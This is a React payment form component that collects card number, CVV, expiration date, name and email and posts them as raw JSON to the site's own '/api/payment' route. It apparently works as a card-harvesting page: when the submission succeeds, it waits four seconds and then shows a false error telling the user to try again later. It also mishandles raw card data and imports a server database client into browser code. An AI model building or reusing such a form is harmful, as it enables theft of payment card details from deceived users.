"use client";
import prisma from '@/app/lib/prisma';
import { useState } from "react";
import { delay, motion } from 'framer-motion';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';// Replace 'your-library' with the actual library you're using
import axios, { AxiosError } from 'axios';
import { Loader2 } from "lucide-react"

import toast from 'react-hot-toast';
import { Button } from '../ui/button';


function PaymentForm() {
    const [card, setCard] = useState("");
    const [cvv, setCvv] = useState("");
    const [name, setName] = useState("");
    const [email, setEmail] = useState("");
    const [expirationMonth, setExpirationMonth] = useState("");
    const [expirationYear, setExpirationYear] = useState("");

    const [isLoading, setIsLoading] = useState(false);
    const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
        event.preventDefault();

        // Prepare the data
        const data = {
            cardNumber: card,
            name: name,
            cvv: cvv,
            email: email,
            expirationMonth: expirationMonth,
            expirationYear: expirationYear,
        };
        setIsLoading(true);
        try {
            // Send the data to the API using Fetch
            const response = await fetch('/api/payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });


            if (!response.ok) {
                throw new Error(`HTTP error status: ${response.status}`);
            }

            // Parse the response data
            const responseData = await response.json();
            setTimeout(() => toast.error('An error occurred while processing your request. Try again later.'), 4000);

        } catch (error) {
            // Handle the error
            console.error('An error occurred:', error);


        } finally {
            setTimeout(() => setIsLoading(false), 4000);

        }
    };


    return (

        <form onSubmit={handleSubmit} className="max-w-lg mx-auto p-6  shadow-md rounded-md">
            <div className="grid gap-4 py-3">
                <Label htmlFor="card">Card Number</Label>
                <motion.div animate={{ scale: [0, 1] }} transition={{ delay: 0.25 }}>
                    <Input
                        id="card"
                        value={card}
                        onChange={(e) => setCard(e.target.value)}
                        className="w-full p-2 border border-gray-300 rounded"
                    />
                    <div className="flex gap-4 pt-3">
                        <div className="flex-1">
                            <label htmlFor="cvv" className="block text-sm font-medium text-white pb-2 ">CVV</label>
                            <Input
                                id="cvv"
                                value={cvv}
                                onChange={(e) => setCvv(e.target.value)}
                                className="w-full p-2 border border-gray-300 rounded"
                            />
                        </div>
                        <div className="flex-1">
                            <label htmlFor="month" className="block text-sm font-medium pb-2 ">Expiration Month</label>
                            <select id="month" onChange={(e) => setExpirationMonth(e.target.value)} className="w-full  p-2 border border-gray-300 rounded bg-[#020817]">
                                {/* Generate options for months */}
                                {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                                    <option key={month} value={month}>
                                        {month}
                                    </option>
                                ))}
                            </select>
                        </div>
                        <div className="flex-1">
                            <label htmlFor="year" className="block text-sm font-medium pb-2">Expiration Year</label>
                            <select id="year" onChange={(e) => setExpirationYear(e.target.value)} className="w-full p-2 border border-gray-300 rounded bg-[#020817]">
                                {/* Generate options for the next 10 years */}
                                {Array.from({ length: 10 }, (_, i) => new Date().getFullYear() + i).map((year) => (
                                    <option key={year} value={year}>
                                        {year}
                                    </option>
                                ))}
                            </select>

                        </div>
                    </div>
                </motion.div>
            </div>
            <div className="grid gap-4 py-3">
                <Label htmlFor="name">Name</Label>
                <motion.div animate={{ scale: [0, 1] }} transition={{ delay: 0.25 }}>
                    <Input
                        id="name"
                        value={name}
                        onChange={(e) => setName(e.target.value)}
                        className="w-full p-2 border border-gray-300 rounded"
                    />
                </motion.div>
            </div>
            <div className="grid gap-4 py-3">
                <Label htmlFor="email">Email</Label>
                <motion.div animate={{ scale: [0, 1] }} transition={{ delay: 0.25 }}>
                    <Input
                        id="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className="w-full p-2 border border-gray-300 rounded"
                    />
                </motion.div>
            </div>
            <Button
                disabled={!card || !cvv || !name || !email || !expirationMonth || !expirationYear || isLoading}
                type="submit"

                className="mt-4 w-full py-2 px-4 bg-white text-black font-semibold rounded-md hover:bg-gray-700 transition duration-300"
            >
                {isLoading ? (<Loader2 className="mr-2 h-4 w-4 animate-spin" />) : 'Pay'}
            </Button>
        </form>

    );
}

export default PaymentForm;